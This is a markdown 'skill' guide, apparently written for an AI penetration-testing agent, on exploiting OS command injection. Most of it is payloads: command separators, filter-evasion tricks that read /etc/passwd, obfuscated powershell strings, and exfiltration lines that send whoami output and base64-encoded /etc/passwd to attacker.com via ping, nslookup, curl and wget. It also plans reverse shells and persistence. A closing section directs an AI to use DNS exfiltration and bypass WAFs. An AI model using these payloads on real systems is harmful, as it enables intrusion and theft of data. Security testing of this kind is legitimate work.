# Command Injection Skill

## Goal

Identify and exploit OS command injection vulnerabilities to execute arbitrary system commands on the target server.

## Methodology

1. **Identify Injection Points:** Find parameters that may be passed to system commands (ping, host lookup, file operations)
2. **Test Command Separators:** Inject shell metacharacters to chain commands
3. **Confirm Execution:** Use time delays or out-of-band techniques to confirm injection
4. **Exfiltrate Data:** Use DNS or HTTP callbacks to extract command output
5. **Escalate Access:** Establish reverse shell or persistent access

## Command Separators

```bash
# Both Unix and Windows
; id                    # Semicolon - chain commands
| id                    # Pipe - execute and pass output
|| id                   # OR - execute if first fails
&& id                   # AND - execute if first succeeds
& id                    # Background execution

# Unix only
`id`                     # Backticks - command substitution
$(id)                    # $() - command substitution
%0a id                   # Newline (URL encoded)

# Combining techniques
ls%0Abash%09-c%09"id"%0A  # Newlines + tabs
```

## Bypass Techniques

```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Blacklist bypass
c'a't /etc/passwd
c"a"t /etc/passwd
\c\a\t /etc/passwd
c$()at /etc/passwd

# Path bypass (Windows)
powershell C:**2\n??e*d.exe
@^p^o^w^e^r^shell
```

## Out-of-Band Exfiltration

```bash
# DNS exfiltration
ping $(whoami).attacker.com
nslookup $(cat /etc/passwd | base64).attacker.com

# HTTP exfiltration
curl http://attacker.com/$(whoami)
wget http://attacker.com/?data=$(cat /etc/passwd | base64)
```

## Common Vulnerable Parameters

```
?cmd=, ?exec=, ?command=, ?ping=, ?query=
?code=, ?func=, ?run=, ?process=, ?load=
```

## Tools

* **Commix** - Automated command injection exploitation
* **Burp Suite** - Intercept and inject payloads
* **tplmap** - Template/command injection scanner

## Example Commands

```bash
# Automated scanning with Commix
commix --url="http://target/ping?ip=127.0.0.1" --batch

# Time-based detection
ping 127.0.0.1; sleep 10
```

## Guidance for AI

* Activate when testing parameters that may execute system commands
* Start with simple separators (`;`, `|`, `&&`) before trying bypass techniques
* Use time delays (`sleep`, `ping -c 10`) to confirm blind injection
* For exfiltration, prefer DNS-based methods when HTTP is blocked
* Check for both Linux and Windows command syntax
* Be aware of WAF/filter bypass techniques using encoding and quoting
